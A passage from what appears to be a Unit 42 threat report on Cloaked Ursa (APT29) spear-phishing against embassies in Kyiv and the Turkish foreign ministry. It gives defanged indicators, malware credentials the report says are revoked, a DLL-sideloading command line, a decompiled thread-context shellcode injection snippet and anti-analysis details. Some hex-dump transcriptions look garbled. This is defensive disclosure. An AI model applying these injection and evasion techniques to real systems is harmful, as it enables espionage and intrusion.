Execution of LNK runs legitimate EXE and opens PNG file\n  \n  5. EXE\n     - EXE loads malicious DLL via DLL hijacking\n  \n  6. DLL\n     - Encrypted shellcode is read into memory and decrypted\n     - Shellcode is injected to running Windows process\n  \n  7. Shellcode\n     - Shellcode decrypts and loads final payload inside current process\n  \n  8. Final payload\n     - Beacons to Dropbox and Microsoft Graph API-based C2s\n```\n\n*Figure 3. Execution flow.*\n\nThese pictures are actually Windows shortcut files masquerading as PNG image files.\n\nWe’ve observed two versions of these illegitimate flyers. The only difference between the two is the shortened URL used in each case. The URLs ultimately redirect the victim to the same coopted site (`hxxps://resetlocations[.]com/bmw.htm`).\n\nAt the time of this writing, one of the flyer versions (SHA256: `311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517`) is detected as malicious by multiple vendors according to VirusTotal, while the other version (SHA256: `8902bd7d085397745e05883f05c08de87623cc15fe630b36ad3d208f01ef0596`) is not detected. For a full overview of the malware, please refer to the Appendix.\n\nOverall, we observed Cloaked Ursa targeting at least 22 of over 80 foreign missions located in Kyiv in this campaign, as shown in Table 1. The actual number targeted is likely higher. This is staggering in scope for what generally are narrowly scoped and clandestine APT operations.\n\n| Known Embassies in Kyiv Targeted by Cloaked Ursa in BMW Campaign |\n|------------------------------------------------------------------|\n| Albania                                                          |\n| Argentina                                                        |\n| Canada                                                           |\n| Cyprus                                                           |\n| Denmark                                                          |\n| Estonia                                                          |\n| Greece                                                           |\n| Iraq                                                             |\n| Ireland                                                          |\n| Kuwait                                                           |\n| Kyrgyzstan                                                       |\n| Latvia                                                           |\n| Libya                                                            |\n| Netherlands                                                      |\n| Norway                                                           |\n| Slovakia                                                         |\n| Spain                                                            |\n| Sudan                                                            |\n| Turkey                                                           |\n| Turkmenistan                                                     |\n| United States                                                    |\n| Uzbekistan                                                       |\n\n*Table 1. Known embassy targets of BMW campaign.*\n\nFor the activity we observed, Cloaked Ursa used publicly available embassy email addresses for approximately 80% of the targeted victims. The remaining 20% consisted of unpublished email addresses not found on the surface web.\n\nThis indicates that attackers likely also used other collected intelligence to generate their victim target list, to ensure they were able to maximize their access to desired networks. The majority of the targeted organizations in this campaign were embassies. However, we also observed Cloaked Ursa targeting both Turkish Ministry of Trade representatives in Ukraine (via their `ticaret[.]gov[.]tr` work emails) and their embassy in the BMW campaign.\n\nWhile there were a handful of emails sent directly to individuals’ work addresses within the campaign, the majority of the targeted emails consisted of general inboxes for the embassy, such as `country.embassy@mfa[.]gov[.]xx`. Despite the thought and detail put into targets for this campaign, at least two of the email addresses contained errors and never reached the intended targets. Overall, the use of these group inboxes likely increased the odds of the emails being reviewed and passed on to individuals within the embassies looking for transportation.\n\nWith a few of the embassies we observed being targeted, this was done via group emails hosted on free online webmail services. While these services offer some protection, they also outsource a portion of the security provided to targeted organizations and their employees to external entities. The use of free online webmail could have the unintended consequence of increasing a diplomatic organization’s difficulty in observing and understanding the totality of threats targeting it while also increasing its attack surface.\n\n## Turkish Diplomats: Humanitarian Assistance for Earthquake\n\nAnother of the novel Cloaked Ursa campaigns we observed likely targeted the Turkish Ministry of Foreign Affairs (MFA) earlier in 2023, within a February to March timeframe. While we were unable to obtain the malicious email lure associated with this campaign, we know that it related to a document that purported to be Turkish MFA guidance on humanitarian assistance pertaining to the Feb. 21, 2023, earthquake in Turkey. The earthquake in late February further ravaged a region already devastated by a massive earthquake two weeks earlier, which ultimately killed more than 50,000 and displaced more than 5.9 million people.\n\nWe were able to determine this second campaign targeting the MFA based on a PDF (shown in Figure 4) that was contained in a downloaded payload (SHA256: `0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839` – for a full overview of the malware, please refer to the Appendix).\n\nNot one to let a disaster and the highly sympathetic charge it generates go to waste, Cloaked Ursa likely saw a lure providing MFA guidance on humanitarian support for this tragedy as a way to ensure a high level of interest from their targets – these recipients would feel a patriotic obligation and would understand the MFA’s expectations to support their nation and its victims. In addition, given the timely and momentous nature of the lure, it was almost certainly forwarded by concerned employees to others in their organization who would be interested in the guidance.\n\n```image\nAlt: Excerpt from Turkish MFA memorandum\nDescription: The image is a PDF excerpt of a memorandum from the Turkish Ministry of Foreign Affairs. It contains official communication regarding humanitarian assistance for citizens affected by earthquakes in Kahramanmaraş, dated February 21, 2023. The document outlines the response to the disaster, including directives for financial contributions from ministry personnel to aid efforts coordinated with the Disaster and Emergency Management Authority (AFAD). The text is in Turkish, featuring headers and organizational details typical of governmental documents.\nTranscription: |\n  T.C. DIŞİŞLERİ BAKANLIĞI\n  Personel Genel Müdürlüğü\n  ______________________________________________________________________\n  \n  GENELGE\n  \n  Tarih : 21.02.2023-E-2023/80327456-PEGM/35614431\n  Konu : Kahramanmaraş'ta meydana gelen depremlerden zarar gören vatandaşlarımıza yardım\n  Dosyası : 010.06.999/Diğer\n  Kimden : PEGM\n  Dağıtım : Tüm Teşkilata (G) (N)\n  \n  21 Şubat 2023 tarihinde Kahramanmaraş’ta meydana gelen ve çevre illerde büyük hasara yol açan deprem felaketlerinden zarar gören vatandaşlarımıza İçişleri Bakanlığı Afet ve Acil Durum Yönetimi Başkanlığı (AFAD) iletilmek üzere Bakanlığımız personeli tarafından maddi katkıda bulunulması Makam tarafından uygun görülmüştür.\n  \n  Bu çerçevede, halihazırda sürekli görevle yurtdışına atanmış (Hukuk Müşaviri, Danışman ve Ataşe Yardımcıları dahil) Bakanlığımız mensuplarının net dış maaşlarının asgari %10’unu; merkez ve yurtdışı teşkilatımızda görevli diğer mensuplarımızın ise arzu ettikleri miktardaki gönüllü katkılarını AFAD Başkanlığı tarafından başlatılan yardım kampanyasına aktarmak üzere 26.03.2023 tarihine kadar aşağıda kayıtlı banka hesaplarına yatırmaları beklenmektedir.\n  \n  Temsilcilerimizce toplanan nihai meblağ ile ilgili bilginin 21.03.2023 tarihinde\n  perd@mfa.gov.tr adresine iletilmesi önemle rica olunur.\n```\n\n*Figure 4. Excerpt from Turkish MFA memorandum.*\n\n## Conclusion\n\nDiplomatic missions will always be a high-value espionage target. Sixteen months into the Russian invasion of Ukraine, intelligence surrounding Ukraine and allied diplomatic efforts are almost certainly a high priority for the Russian government.\n\nAs the above campaigns show, diplomats should appreciate that APTs continually modify their approaches – including through spear phishing – to enhance their effectiveness. They will seize every opportunity to entice victims into compromise. Ukraine and its allies need to remain extra vigilant to the threat of cyber espionage, to ensure the security and confidentiality of their information.\n\n### Recommendations\n\n- Train newly assigned diplomats and employees to a diplomatic mission on the cybersecurity threats for the region prior to their arrival. This training should include the specific tactics, techniques and procedures (TTPs) used by APTs in that region.\n- Always take extra precautions to observe URL redirection when using URL-shortening services.\n- Always be cautious of downloads, even from seemingly innocuous or legitimate sites. APTs routinely co-opt legitimate sites or services for malicious purposes.\n- Always take extra precautions with attachments that require a web browser to open. These types of attachments include the following file extensions: `.hta`, `.htm`, `.html`, `.mht`, `.mhtml`, `.svg`, `.xht` and `.xhtml`.\n- Always verify file extension types to ensure you are opening the type of file you intend to. If the file extension does not match, or if it is attempting to obfuscate its nature, it is very likely malicious.\n- When received as an attachment to an email, or when downloaded from a link within an email, always look for hidden files and directories in archives such as those with the extensions `.zip`, `.rar`, `.7z`, `.tar` and `.iso`. The presence of hidden files or directories could indicate the archive is malicious.\n- Consider disabling JavaScript as a rule.\n\nPalo Alto Networks customers receive protections against the types of threats discussed in this article by products including:\n\n- Cortex XDR\n- WildFire\n- Cloud-Delivered Security Services for the Next-Generation Firewall, including Advanced URL Filtering and DNS Security.\n\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call:\n\n- North America Toll-Free: 866.486.4842 (866.4.UNIT42)\n- EMEA: +31.20.299.3130\n- APAC: +65.6983.8730\n- Japan: +81.50.1790.0200\n\nPalo Alto Networks disclosed this activity to Microsoft and Dropbox.\n\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the Cyber Threat Alliance.\n\n## Indicators of Compromise\n\n### Samples\n\n- `311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517`\n- `8902bd7d085397745e05883f05c08de87623cc15fe630b36ad3d208f01ef0596`\n- `47e8f705febc94c832307dbf3e6d9c65164099230f4d438f7fe4851d701b580b`\n- `79a1402bc77aa2702dc5dca660ca0d1bf08a2923e0a1018da70e7d7c31d9417f`\n- `38f8b8036ed2a0b5abb8fbf264ee6fd2b82dcd917f60d9f1d8f18d07c26b1534`\n- `706112ab72c5d770d89736012d48a78e1f7c643977874396c30908fa36f2fed7`\n- `c62199ef9c2736d15255f5deaa663158a7bb3615ba9262eb67e3f4adada14111`\n- `cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a`\n- `0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839`\n- `60d96d8d3a09f822ded0a3c84194a5d88ed62a979cbb6378545b45b04353bb37`\n- `03959c22265d0b85f6c94ee15ad878bb4f2956a2b0047733edbd8fdc86defc48`\n\n### URLs\n\n- `hxxp://tinyurl[.]com/ysvxa66c`\n- `hxxp://t[.]ly/1IFg`\n- `hxxps://resetlocations[.]com/bmw.htm`\n- `hxxps://tinyurl[.]com/mrxcjsbs`\n- `hxxps://simplesalsamix[.]com/e-yazi.html`\n- `hxxps://www.willyminiatures[.]com/e-yazi.html`\n\n### Known Email Senders\n\n- `dawid.tomaszewski@resetlocations[.]com`\n- `ops.rejon4@kazmierz[.]pl`\n\n### BMW Payload: Dropbox and MS Graph API Tokens and Secrets\n\n- `Teams_test`\n- `840aae0d-cd89-4869-bce1-94222c33035e`\n- `M.R3_BL2.-CYZcTMwdTTD5X9lMxE*wscQcrZ56RUoklIvNkUw5pW1kJ9tfqvv1vRT8VgOb8uXtJTPB3E2CKV!pmm4V6DF8TRvo60QFCxMnUAnuv3jJ78TqHMdxPHONUDeI!B4DbLyg6ZjPZzghLXtmTZqzxOfpCUInOnhFJGoiL6kob7hKVhxm2dJQ9whK9zORxKg0FAnmd0tAR9lKJJaIUkVLcQ939EG2EKG9xsVVWwL04kX0092j7r2jo0rQR9Nqe4DuG0cRAMoODktAbTiuIsehkO5bM0ZuHsDuRr6mMoJrpwbqP0nt5PqJ*E7TS2scdYYOxnQ0mQ$$`\n- `iofd62cx8jy9vyp`\n- `sx6qt5iw2t9y7r8`\n- `GCy8UdFrumsAAAAAAAAAASYLcT6_Rjx8PYFAvKH3Q3fT27eYzNsXJYCz7320YBIM`\n\n### Turkey MFA Payload: Dropbox and MS Graph API Tokens and Secrets\n\n- `e0f94357-98c9-475d-94eb-27b6c74a6429`\n- `mytestworkapp1`\n- `M.R3_BL2.-CUanxFBYCxVzJ6hwSYPoLZ49NQ3X*y5rETt!aN*487MvafwQFn7kevSiXUwpGnHaquakM8vH6iESLDlXP38hmqQn98rRLvOzWwlKmD!8Xb5yEewCaa13S4Y1VyTIswo54Ez5ihRdUYCkYxkidMsZBn5!4icBZKpwC9hDW6G8OLcj8c2ZDtl8kUJ5PaX5TTDgXRzYdLPcqJFiNREjNg0*L569xMG1D14JpmjuO3HLBN2OclUv6c9FeuRwe5EuHA9aKhdqWkdjxWbnGGMgn9SnyDF7VSVCYT0*KBPNE!WYm*CXbE4jNTqJnkyPzvDJtj0OoA$$`\n- `3a1n71ujslwse9v`\n- `75vedbskd505jyk`\n- `Hd0j7avNBxsAAAAAAAAAARq2fs5Ei8Z0-ahPPeB1McEek6NMzkGRmYHuxjsCZTfE`\n\n## Additional Resources\n\n- Espionage Campaign Linked to Russian Intelligence Services – Cybersecurity Emergency Response Team Poland (CERT.PL)\n- Cloaked Ursa / APT29 Phishing Tweet (March 10, 2023) – Palo Alto Networks, Unit 42\n- IOCs: Cloaked Ursa / APT29 Phishing Tweet (March 10, 2023) – Palo Alto Networks, Unit 42\n- Russian APT29 Hackers Use Online Storage Services, DropBox and Google Drive – Palo Alto Networks, Unit 42\n\n## Appendix\n\n### Technical Analysis of BMW Campaign\n\nThe hyperlinks found within the malicious `BMW 5 for sale in Kyiv - 2023.docx` flyers (SHA256: `311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517` and SHA256: `8902bd7d085397745e05883f05c08de87623cc15fe630b36ad3d208f01ef0596`) lead to a site (`hxxps://resetlocations[.]com/bmw.htm`) that was offline in mid-June, but they originally retrieved a large HTA file (SHA256: `47e8f705febc94c832307dbf3e6d9c65164099230f4d438f7fe4851d701b580b`). This HTA file contains roughly 10 MB of Base64-encoded and XORed data, followed by JavaScript code.\n\nThe JavaScript code would first make a request to the same domain on the URI `kll.php`, before decoding the embedded data mentioned above and triggering the browser to download it using `msSaveOrOpenBlob`, or a mix of `createElement` and `createObjectURL` should `msSaveOrOpenBlob` fail. The downloaded file is assigned the name `bmw.iso` (SHA256: `79a1402bc77aa2702dc5dca660ca0d1bf08a2923e0a1018da70e7d7c31d9417f`), matching the theme seen thus far.\n\nOnce downloaded, execution is reliant on the user clicking the downloaded file, which mounts the disk image to the system and opens up Windows File Explorer. This reveals nine total files masquerading as images, which are instead LNK shortcut files (shown in the execution flow diagram in Figure 3).\n\nA hidden folder named `$Recycle.Bin` is created alongside the LNK files. This folder contains the real PNG images as well as three DLLs, an encrypted payload and a legitimate copy of Microsoft Word named `windoc.exe`.\n\nIf one of the LNK files is clicked, the following command line is executed. Note that the image name is changed depending on the LNK file clicked:\n\n```image\nAlt: Command line of the LNK file\nDescription: The image displays a command line instruction related to the execution of a potentially malicious process. It shows a command that starts a program (`windoc.exe`) located in the `$Recycle.Bin` directory and then attempts to execute a PNG file (`bmw1.png`) from the same directory. The command structure includes `cmd /c start`, which indicates that it is intended to run in the Windows command prompt, suggesting an automated or scripted execution as part of malware behavior.\nTranscription: |\n  cmd /c start .\\$Recycle.Bin\\windoc.exe && .\\$Recycle.Bin\\bmw1.png\n```\n\nWhile `windoc.exe` is not malicious, it does attempt to load several DLLs on runtime and falls victim to DLL hijacking. As a result, it will load two of the three DLLs within its current directory, namely `APPVISVSUBSYSTEMS64.dll` (SHA256: `38f8b8036ed2a0b5abb8fbf264ee6fd2b82dcd917f60d9f1d8f18d07c26b1534`) and `MSVCP140.dll` (SHA256: `706112ab72c5d770d89736012d48a78e1f7c643977874396c30908fa36f2fed7`). The third DLL (`Mso20Win32Client.dll`) does not appear to be essential to the malware’s functioning and is added so that `windoc.exe` runs correctly, similarly to the DLL described below.\n\n`MSVCP140` is not digitally signed, but does not contain any malicious functionality. It appears to only contain a select few exports from a legitimate copy of `MSVCP140`. It’s likely that this was included to execute `windoc.exe` on systems that did not have Microsoft Visual C++ Redistributables – at least enough so that it would load `APPVISVSUBSYSTEMS64`.\n\n`APPVISVSUBSYSTEMS64`, on the other hand, is a fairly obfuscated DLL. It leverages a large number of unnecessary assembly instructions, including the following, likely hindering decompilation efforts and slowing down analysis:\n\n- `Psllq`\n- `Emms`\n- `Pcmpeqd`\n- `Punpckhbw`\n\n`APPVISVSUBSYSTEMS64` contains a number of anti-analysis techniques, including the following:\n\n- Making sure its process name is set to `windoc.exe`\n- Checking that the system has more than one processor\n- Leveraging `NtQueryObject` to search for any existing `Debug Objects`, to check for the existence of a debugger\n\nIf these checks are all passed, the sample will proceed to open the encrypted payload file found within the ISO file, in this case named `ojg2.px` (SHA256: `c62199ef9c2736d15255f5deaa663158a7bb3615ba9262eb67e3f4adada14111`). Once read into memory, it will decrypt the file using an XOR operation, which results in a secondary shellcode layer.\n\nThe shellcode is then injected into the first two active Windows processes that it can inject into, such as `taskhost.exe` or `sihost.exe`, using a technique that is somewhat similar to one previously used by Cloaked Ursa (as recently described by the Military Counterintelligence Service and CERT.PL).\n\nFirst, the shellcode is mapped and copied into the remote process using `NtMapViewOfSection` before a new remote thread is created in a suspended state using `NtCreateThreadEx`. The interesting aspect of this injection technique is that instead of the created thread pointing to the shellcode entry point or any Windows API, it is given a start address of a function within the `APPVISVSUBSYSTEMS64` process. It’s possible that the authors did this to evade monitoring tools from identifying a newly created thread pointing to malicious shellcode.\n\nBefore the thread is resumed with `NtResumeThread`, `APPVISVSUBSYSTEMS64` will use `NtGetContextThread` and `NtSetContextThread` to modify the `RCX` register (which will contain the thread entry) to point to the entry point of the shellcode.\n\n```image\nAlt: Creation of thread pointing to a local function\nDescription: The image depicts a snippet of code related to the process of creating and managing threads in a Windows environment. It includes calls to functions such as `NtCreateThreadEx`, `NtGetContextThread`, and `NtSetContextThread`. The code is likely part of the malware's execution flow, showcasing how the malware handles thread creation and context manipulation to evade detection and facilitate its malicious activities.\nTranscription: |\n  NtCreateThreadEx(\n      (__int64*)&v47,\n      PROCESS_ALL_ACCESS,\n      0i64,\n      (__int64)Handle,\n      (__int64)NtQueryPerformanceCounter, // function to resolve NtQueryPerformanceCounter (in local process)\n      0i64,\n      0i64,\n      0i64,\n      0i64,\n      0i64,\n      0i64);\n  if ( v47 )\n  {\n      Str1.ContextFlags = 0x10000B;\n      if ( (unsigned int)NtGetContextThread((__int64)v47, (__int64)&Str1) )\n      {\n          v30 = 1i64;\n          do\n              --v30;\n          while ( v30 );\n          NtClose(v47);\n          NtClose(Handle);\n          v31 = calloc(3ui64, 2ui64);\n          for ( i = 0i64; i != 3u; ++i )\n              v31[i] ^= 0x72u;\n          free(v31);\n          return 0i64;\n      }\n  }\n  sub_387C93501();\n  Str1.Rcx = shellcodePointer;\n  if ( (unsigned int)NtSetContextThread((__int64)v47, (__int64)&Str1, v33, v34) )\n```\n\nThis results in the resumed thread calling `RtlUserThreadStart`, which will move the value in the `RCX` register to `R9` before calling it, thus triggering the shellcode.\n\nThe goal of the shellcode is to extract the final executable file payload in memory and transfer execution to it. This payload is the final sample in the infection chain and is responsible for handling communication to and from the command and control (C2) server.\n\nThe final payload contains a large array of obfuscation techniques, including string encryption and junk functions, as well as modifying exception handling structures to place “try and except” clauses part way through assembly instructions. This effectively breaks the instructions when disassembling, as many disassemblers will take these structure values into consideration when parsing a binary file. This results in a mangled control flow graph and failed decompilation due to the modifications in the exception handling structures.\n\nFor communication, the payload uses both the Microsoft Graph and Dropbox API. Cloaked Ursa has previously leveraged Dropbox as a C2 server. However, Cloaked Ursa’s use of Microsoft Graph API to facilitate C2 communications appears to be a relatively new addition to their toolkit.\n\nIn addition to the string encrypted tokens and API keys required to communicate with these platforms, there is another string that stands out (shown in Figure 6), used when communicating with the Microsoft Graph API: `Teams_test`.\n\n```image\nAlt: String decryption functions used to decrypt core Dropbox and Microsoft Graph API information\nDescription: The image displays a snippet of code related to a decryption function. It shows multiple calls to a `string_decrypt` function, with parameters that include indices and unknown variables. Each line appears to decrypt specific strings, some of which are noted in the comments, including 'Teams_test' and other obfuscated data. This snippet is relevant to the technical analysis of a malware campaign, illustrating how the malware handles decryption of communication with command and control servers.\nTranscription: |\n  string_decrypt(a1, &unk_140126521, 0x44ui64); // b'840aae0d-cd89-4869-bce1-94222c33035e'\n  string_decrypt(a1 + 32, &unk_140126566, 0x2Aui64); // b'Teams_test'\n  string_decrypt(a1 + 64, &unk_140126591, 0x16Eui64); // b'M.R3_B12.-CYZcTMwdTTD5X91MxE*wscQcrZ5RUoklIvNkUw5pW1kJ9tfqvv1vRT8VgO'\n  string_decrypt(a1 + 96, &unk_140126700, 0x2Fui64); // b'iofd62c8jy9vyp'\n  string_decrypt(a1 + 128, &unk_140126730, 0x2Fui64); // b'sx6qt5wi2t9y7r8'\n  string_decrypt(a1 + 160, &unk_140126760, 0x60ui64); // b'GCy8UdrumsAAAAAAAAASYLcT6_Rjx8PYFAvkH3Q3fT27eYzNsXJYCz7320YBIM'\n```\n\nGiven that the Graph API allows for interacting with a number of different Microsoft 365 Services including Microsoft Teams, it’s possible that this was an initial test for communicating via Teams or the Graph API.\n\nIf communication fails via the Graph API several times, communication via Dropbox is attempted. Several decrypted strings in the binary provide insight into the use of Dropbox for communication.\n\n```image\nAlt: Decrypted strings in the binary that used the Dropbox API\nDescription: The image displays a list of URLs related to the Dropbox API, presenting various endpoints such as those for OAuth token retrieval, file management (create, list, download, and upload), and tagging functionalities. The URLs are formatted in a simple, clear text layout, indicating their purpose in API communication.\nTranscription: |\n  https://api.dropboxapi.com/oauth2/token\n  https://api.dropboxapi.com/2/files/create_folder_v2\n  https://api.dropboxapi.com/2/files/list_folder\n  https://api.dropboxapi.com/2/files/tags/get\n  https://api.dropboxapi.com/2/files/tags/remove\n  https://api.dropboxapi.com/2/files/tags/add\n  https://content.dropboxapi.com/2/files/download\n  https://content.dropboxapi.com/2/files/upload\n```\n\nPreviously, Cloaked Ursa-linked payloads that communicate with Dropbox had wrapped communications in a packet that resembled an MP3 file. The MP3 magic bytes (`ID3\\x04\\x00\\x00\\x00\\x00\\x00#TSSE`) were prepended to the encrypted data and uploaded to Dropbox as an MP3 file.\n\nIn this sample, it appears that they have opted to use BMP files. The threat actor-owned C2 will upload commands to Dropbox that are wrapped in the BMP format. These commands are retrieved by the payload and then parsed, decrypted and executed. Any data that the payload uploads to Dropbox will also be encrypted and wrapped in the BMP format.\n\nIn terms of handled commands, the payload accepts five possible requests from the C2 server, as described in the table below.\n\n| Command Value | Command Description                                       |\n| ------------- | --------------------------------------------------------- |\n| 0             | Inject shellcode into `explorer.exe` or `smartscreen.exe` |\n| 1             | Execute specified command with `CMD.exe`                  |\n| 2             | Read from local file                                      |\n| 3             | Write data to local file                                  |\n| 4             | Spawn and inject code into `WerFault.exe`                 |\n\n*Table 2. Commands handled by sample.*\n\nBased on the lack of additional commands, it’s likely this is merely a loader for a further sample. As of mid-June, the Dropbox and Graph API credentials are no longer valid, preventing access to any information that was uploaded to either platform.\n\n### Technical Analysis of Turkey Campaign\n\nWe identified an additional sample with similar characteristics to other attributed Cloaked Ursa campaigns, which we believe to have been targeting the Turkish Ministry of Foreign Affairs. We did not observe the lure or lures used in this campaign, but we are able to identify the attack chain after the original lure. We assess that the original lure enticed the target to click on `hxxps://simplesalsamix[.]com/e-yazi.html`. The URL is no longer active, but it originally retrieved an HTTP smuggling file named `e-yazi.html` (SHA256: `cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a`).\n\nThe downloaded file is assigned the name `e-yazi.zip` (SHA256: `0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839`). This sample contains five files.\n\nOnce again, a legitimate `WinWord.exe` binary was found within the archive, named `e-yazi.docx.exe`. However, whitespace was added between the `.docx` and `.exe`, resulting in the file appearing as a document file.\n\nAlongside the `WinWord.exe`, a file named `APPVISVSUBSYSTEMS64.dll` (SHA256: `60d96d8d3a09f822ded0a3c84194a5d88ed62a979cbb6378545b45b04353bb37`) was present once again, as well as a file named `okxi4t.z` (SHA256: `03959c22265d0b85f6c94ee15ad878bb4f2956a2b0047733edbd8fdc86defc48`). This file is similar to the previously mentioned `ojg2.px` in that it contains encrypted shellcode.\n\nOn execution of `WinWord.exe`, `APPVISVSUBSYSTEMS64.dll` is sideloaded and (assuming the standard anti-analysis checks were passed) it would open and read the data from `okxi4t.z` before decrypting it and injecting it into the first running process it can.\n\nThe injected shellcode shares a number of similarities with code seen in the BMW-related sample, such as the following:\n\n- General execution flow\n- Functionality to unhook numerous Windows API calls\n- Its obfuscation techniques\n\nWe were also able to confirm that the shellcode contained overlaps with the fourth-stage shellcode dropper loader, shown in Figure 7, as described in the Cloaked Ursa QUARTERRIG malware report by Military Counterintelligence Service and CERT.PL. The same algorithm and payload structure can be seen within the injected shellcode, as shown in Figure 8, aside from minor differences such as the values of the `magic_const` and `hashed_str`.\n\n```image\nAlt: CERT.PL shellcode structure image\nDescription: The image displays a hex dump from a memory analysis tool or reverse engineering software. It shows hexadecimal values on the left and corresponding ASCII characters on the right. The bookmarks panel on the right highlights various identifiers such as 'hashed_str', 'magic_const', 'key_a', 'data_size', 'key_b', and 'encrypted_data', indicating specific data structures or segments of interest within the hex dump. This type of visualization is commonly used in cybersecurity investigations to analyze encrypted or obfuscated payloads.\nTranscription: |\n  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000C0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000D0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000E0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000F0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000140: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000150: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001C0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001D0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001E0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001F0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n```\n\n*Figure 7. CERT.PL shellcode structure image. (Source: Figure 10 of the QUARTERRIG Malware Analysis Report, 2023)*\n\n```image\nAlt: Extracted shellcode blob\nDescription: The image displays a hex dump, which is a representation of binary data in hexadecimal format. The left column shows the memory addresses, while the central section reveals the hexadecimal values of the data stored at those addresses. The right side contains the corresponding ASCII representation of the hexadecimal values where applicable. Notably, the string 'WCTNF7RX' is highlighted, indicating a significant piece of data within the dump. This format is commonly used in cybersecurity to analyze malware or reverse-engineer applications by examining the underlying bytecode.\nTranscription: |\n  000006D0  00 00 00 00 00 00 00 00  57 43 54 4E 37 52 58 00  |........WCTNF7X.|\n  000006E0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  0000070E  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  0000070F  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000710  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000720  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000730  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000740  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000750  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000760  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000770  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000780  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000790  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007A0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007B0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007E0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007F0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000800  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000810  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000820  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000840  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n```\n\n*Figure 8. Extracted shellcode blob.*\n\nThe final payload within this infection chain is somewhat similar to the BMW-linked final payload, in that it leverages both Microsoft Graph API and the Dropbox API for C2 communication. Instead of `Teams_test` being the project name, it’s set to `mytestworkapp1`. The hard-coded API tokens are also different from the initially analyzed sample.\n\nSimilar obfuscation was employed within this sample, including string encryption and control flow obfuscation via abusing the exception handling structures. However, there are no junk functions added to the sample, resulting in a much smaller file size of 498 KB.\n\nIt’s worth noting that the string encryption algorithms appear to line up with those seen within the Cloaked Ursa SNOWYAMBER and QUARTERRIG malware reports by the Military 